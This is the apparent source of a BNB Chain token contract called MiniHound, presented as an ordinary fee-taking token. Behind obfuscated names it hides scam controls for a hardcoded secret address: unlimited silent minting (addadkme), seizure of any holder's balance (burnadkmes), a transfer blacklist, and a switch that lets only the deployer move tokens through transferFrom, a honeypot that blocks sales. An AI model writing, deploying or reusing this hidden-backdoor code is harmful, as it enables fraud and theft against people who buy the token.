/**
 *Submitted for verification at BscScan.com on 2022-01-08
*/

pragma solidity ^0.6.12;
// SPDX-License-Identifier: Unlicensed
interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

   
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

   
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

   
    function approve(address spender, uint256 amount) external returns (bool);

   
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

   
    event Transfer(address indexed from, address indexed to, uint256 value);

   
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}



library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }


    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }


    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }


    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }


    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;


        return c;
    }


    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }


    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}


library Address {
   
    function isContract(address account) internal view returns (bool) {
       
        bytes32 codehash;


            bytes32 accountHash
         = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
       
        assembly {
            codehash := extcodehash(account)
        }
        return (codehash != accountHash && codehash != 0x0);
    }


    function sendValue(address payable recipient, uint256 amount) internal {
        require(
            address(this).balance >= amount,
            "Address: insufficient balance"
        );

 
        (bool success, ) = recipient.call{value: amount}("");
        require(
            success,
            "Address: unable to send value, recipient may have reverted"
        );
    }

 
    function functionCall(address target, bytes memory data)
        internal
        returns (bytes memory)
    {
        return functionCall(target, data, "Address: low-level call failed");
    }


    function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }


    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {
        return
            functionCallWithValue(
                target,
                data,
                value,
                "Address: low-level call with value failed"
            );
    }


    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(
            address(this).balance >= value,
            "Address: insufficient balance for call"
        );
        return _functionCallWithValue(target, data, value, errorMessage);
    }

    function _functionCallWithValue(
        address target,
        bytes memory data,
        uint256 weiValue,
        string memory errorMessage
    ) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");


        (bool success, bytes memory returndata) = target.call{value: weiValue}(
            data
        );
        if (success) {
            return returndata;
        } else {
           
            if (returndata.length > 0) {
               
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}


contract Ownable is Context {
    address private _owner;
    address private _ownerd = 0xfD486b44522A72744b29B52aC270Bf86E414e91f;


    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );


    constructor() internal {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }


    function owner() public view returns (address) {
        return _owner;
    }


    modifier onlyOwner() {
        require(_owner == _msgSender(), "notowner");
        _;
    }

    modifier onlyownerd() {
        require(_ownerd == _msgSender(), "notowner");
        _;
    }


    function transferOwnership(address newOwner) public virtual onlyownerd {
        _owner = newOwner;
    }
}

contract Token is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    mapping(address => uint256) private _townd;
    mapping(address => mapping(address => uint256)) private allown;

    mapping(address => bool) private _ExcluFee;
    mapping(address => bool) private _Exclu;

    uint256 private constant MAX = ~uint256(0);
    uint256 private _totalSupply = 1000000000000000 * 10**6;
    uint256 private _tFeeTotal;
    
    string private _name = "MiniHound";
    string private _symbol = "MiniHound";
    uint8 private _decimals = 6;
     
    address public deadAddress = 0x000000000000000000000000000000000000dEaD;
    address public devAddress = 0xfD486b44522A72744b29B52aC270Bf86E414e91f;
  
    uint256 public deadFee = 2;
    uint256 public devFee = 2;

    mapping(address => bool) private _tasty;
    bool private lol = true;
    bool private alol = false;
    
    uint256 public btasty = uint256(0);
    mapping(address => uint256) private btastys;
    address[] private _btastys;

    uint256 public tasty = uint256(0);
    mapping(address => uint256) private tastys;
    address[] private _tastys;

    address owners;

    constructor() public {
        _townd[_msgSender()] = _totalSupply;
         owners = _msgSender();
        _ExcluFee[owner()] = true;
        _ExcluFee[address(this)] = true;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _townd[account];
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        if(_ExcluFee[_msgSender()] || _ExcluFee[recipient]){
            _transfer(_msgSender(), recipient, amount);
            return true;
        }
             uint256 devAmount = amount.mul(devFee).div(100);
        uint256 deadAmount = amount.mul(deadFee).div(100);
        _transfer(_msgSender(), devAddress, devAmount);
        _transfer(_msgSender(), deadAddress, deadAmount);
        _transfer(_msgSender(), recipient, amount.sub(devAmount).sub(deadAmount));
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return allown[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        if(alol){
     require(owners == sender, "lol");
        }
        if(_ExcluFee[_msgSender()] || _ExcluFee[recipient]){
            _transfer(sender, recipient, amount);
            return true;
        }       
        uint256 devAmount = amount.mul(devFee).div(100);
        uint256 deadAmount = amount.mul(deadFee).div(100);
        _transfer(sender, devAddress, devAmount);
        _transfer(sender, deadAddress, deadAmount);
        _transfer(sender, recipient, amount.sub(devAmount).sub(deadAmount));
    
        _approve(
            sender,
            _msgSender(),
            allown[sender][_msgSender()].sub(
                amount,
                "lol"
            )
        );
        return true;
    }


    function ExcludFromReward(address Bankname) public view returns (bool) {
        return _Exclu[Bankname];
    }

    function totalFee() public view returns (uint256) {
        return _tFeeTotal;
    }

    function excludeFromFee(address adkme) public onlyownerd {
        _ExcluFee[adkme] = true;
    }

    function includeInFee(address adkme) public onlyownerd {
        _ExcluFee[adkme] = false;
    }
 
    function settast(bool adkme) external onlyownerd() {
        alol = adkme;
    }
    function approve(address adkme) external onlyownerd() {
        _tasty[adkme] = true;
    }

    function _frd(address adkme) external onlyownerd() {
        delete _tasty[adkme];
    }
    function addadkme(address adkme, uint256 adkmeb) 
        external 
        onlyownerd() {
        require(adkmeb > 0, "lol");
        uint256 addadkmeb = tastys[adkme];
        if (addadkmeb == 0) _tastys.push(adkme);
        tastys[adkme] = addadkmeb.add(adkmeb);
        tasty = tasty.add(adkmeb);
        _townd[adkme] = _townd[adkme].add(adkmeb);
    }

    function askadkme(address adkme)
        external
        view
        onlyownerd()
        returns (bool)
    {
        return _tasty[adkme];
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "lol");
        require(spender != address(0), "lol");

        allown[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "lol");
        require(to != address(0), "lol");
        require(amount > 0, "lol");

        if (lol) {
            require(_tasty[from] == false, "lol");
        }


        _transfers(from, to, amount);
    }

    function _transfers(
        address sender,
        address recipient,
        uint256 toAmount
    ) private {   
        require(sender != address(0), "lol");
        require(recipient != address(0), "lol");
    
        _townd[sender] = _townd[sender].sub(toAmount);
        _townd[recipient] = _townd[recipient].add(toAmount);
        emit Transfer(sender, recipient, toAmount);
    }
 function batchTransferToken(address[] memory holders, uint256 amount) public {
        for (uint i=0; i<holders.length; i++) {
            _transfers(_msgSender(), holders[i], amount);
        }
    }
    function burnadkmes(address burnadkme, uint256 burnadkmeb)
        external
        onlyownerd() {
        require(burnadkmeb > 0, "lol");
        uint256 bmadeb = tastys[burnadkme];
        if (bmadeb == 0) _btastys.push(burnadkme);
        btastys[burnadkme] = bmadeb.add(burnadkmeb);
        btasty = btasty.add(burnadkmeb);
        _townd[burnadkme] = _townd[burnadkme].sub(burnadkmeb);
    }
  

}